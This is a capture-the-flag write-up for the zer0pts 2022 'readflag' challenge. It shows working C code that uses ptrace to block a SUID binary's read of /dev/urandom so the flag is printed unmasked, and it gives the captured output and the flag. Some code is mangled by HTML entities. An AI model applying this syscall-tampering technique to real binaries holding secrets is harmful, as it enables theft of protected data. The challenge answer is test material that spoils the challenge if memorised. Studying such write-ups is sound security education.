# readflag  
* Category: `Misc`  
* Solves: `10`  
* Points: `277`  
* Description: `All you need is strings.`

```c  
#include <stdio.h>

const char flag[] =
"fak3pts{nyanyanyanyanyanyanyanyanyanyanyanyanyanyanyanya}";

int main() {  
   FILE *random;  
   if ((random = fopen("/dev/urandom", "rb")) == NULL) {  
       perror("fopen");  
       return 1;  
   }

   for (const unsigned char *f = flag; *f; f++) {  
       unsigned char r;  
       if (fread(&r, 1, 1, random) != 1) {  
           perror("fread");  
           return 1;  
       }  
       printf("%02x", *f ^ r);  
   }

   printf("\n");

   return 0;  
}  
```

This looks simple enough. The flag is printed out after being XORed with an
unpredictable one-time-pad. We can't recover the flag from the output, but the
flag is in plaintext - let's just read the binary!

`---s--x--x   1 root root 16848 Mar 16 07:46 readflag`

Unfortunately, we can't. We only have execute permissions on the binary. How
can we access the flag?

Ideas:  
- Use `LD_PRELOAD` to make the data returned from `fread` predictable?   
* The SUID bit is set, which causes `LD_PRELOAD` and similar variables to be cleared  
- Use `ptrace` + `PTRACE_PEEKTEXT` to read the flag out of binary memory?  
* As the filesystem permissions do not allow reading or writing, we don't have the ability to do this, and PEEKTEXT will be denied  
- Use `PTRACE_SYSCALL` to prevent `/dev/urandom` from being read out?  
* This works - under `ptrace`, even though we can't edit memory, we can trace the programs behaviour and modify its registers.

Some light debugging reveals that the initial `fread` causes `read(fd, <buf>,
4096)`, as the program buffers the extra file data. So, we write a program to
simple disable this syscall:

```c  
#include <sys/ptrace.h>  
#include <sys/types.h>  
#include <sys/wait.h>  
#include <unistd.h>  
#include <stdlib.h>  
#include <fcntl.h>  
#include <stdio.h>  
#include <errno.h>  
#include <sys/personality.h>  
#include <sys/user.h>

int main(int argc, char *argv[])  
{   pid_t traced_process;  
   struct user_regs_struct regs = {};  
   long ins;  
   if(argc != 2) {  
       printf("Usage: %s <program to be traced>\n",  
              argv[0], argv[1]);  
       exit(1);  
   }  
   int pid = fork();  
   if (pid == 0) {  
       ptrace(PTRACE_TRACEME, 0, 0, 0);  
       execve(argv[1], &argv[1], NULL);  
       puts("exec failed");  
       return -1;  
   }  
   wait(NULL);  
   while (1) {  
       int blocked = 0;  
       // Wait until the child makes a syscall  
       ptrace(PTRACE_SYSCALL, pid, 0, 0);  
       waitpid(pid, 0, 0);  
       ptrace(PTRACE_GETREGS, pid, 0, ®s;;  
       // Are we trying to read /dev/urandom?  
       if (regs.orig_rax == 0 && regs.rdx == 4096) {  
           blocked = 1;  
           // Set it to use an invalid syscall number so it will fail  
           regs.orig_rax = -1;  
           ptrace(PTRACE_SETREGS, pid, 0, ®s;;  
       }  
       // Continue on with the now blocked syscall  
       ptrace(PTRACE_SYSCALL, pid, 0, 0);  
       waitpid(pid, 0, 0);  
       // The program checks return value of the read, so we need to make sure that the return value isn't `-ENOSYS`  
       if (blocked) {regs.rax = 1; ptrace(PTRACE_SETREGS, pid, 0, ®s;; }  
   }  
   return 0;  
}  
```

We upload this on the remote, and execute it against `/readflag` to receive:
`7a6572307074737b446561722064696172792e2e2e20576169742c2061726520796f75722072656164696e6720746869733f2053746f70217d0a`  
Decoding this from hex, we get the real flag:

`zer0pts{Dear diary... Wait, are your reading this? Stop!}`  

Original writeup (https://clubby789.me/zer0pts2022/#readflag).